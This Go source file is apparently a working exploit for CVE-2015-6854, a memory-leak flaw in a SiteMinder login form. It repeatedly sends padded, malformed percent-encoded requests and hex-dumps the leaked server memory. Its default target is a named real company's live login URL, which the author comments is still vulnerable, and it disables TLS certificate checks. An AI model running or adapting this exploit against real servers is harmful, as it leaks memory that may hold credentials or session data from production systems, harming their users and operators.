/*
This is my exploit for CVE-2015-6854 (likely similar for CVE-2015-6853)
I'm not aware of any other public exploits for this vulnerability.
The web server will reflect a GET input value back to us
The web server will "successfully" decode invalid URL encoded data
This allows us to leak bytes past the end of our input value, up until the next null byte (or segfault)
I alternatively dubbed it: printf("%s", heartbleed)
It produces hexdump like output of the obtained leaked bytes
*/
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"crypto/tls"
	"net/http"
	"regexp"
	"strings"
)

func main() {
	regex := flag.String("regex", "<input type=hidden name=smquerydata value=\"(.*)\">", "Regex with submatch to retrieve output")
	baseurl := flag.String("url", "https://login.chrysler.com/siteminderagent/forms/login.fcc/login.fcc?SMQUERYDATA=", "url to check, value to check last") // Yes, Chrysler are actually still vulnerable. Yes, I've notified them.
	flag.Parse()
	match := regexp.MustCompile(*regex)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // here be dragons
			},
		},
	}
	pad := 0
	for {
		url := fmt.Sprintf("%s%s%%", *baseurl, strings.Repeat("x", pad))
		req, e := http.NewRequest("GET", url, nil)
		if e != nil {
			fmt.Println(e)
			continue
		}
		r, e := client.Do(req)
		if e != nil {
			fmt.Println(e)
			return
		}
		body, e := ioutil.ReadAll(r.Body)
		r.Body.Close()
		if e != nil {
			fmt.Println(e)
			continue
		}
		fmt.Println(r.Status, "-", pad)
		leaks := match.FindSubmatch(body)
		if len(leaks) > 1 && len(leaks[1]) > pad {
			dump := hex.Dump(leaks[1][pad:])
			fmt.Print(dump)
		}
		pad++
	}
}
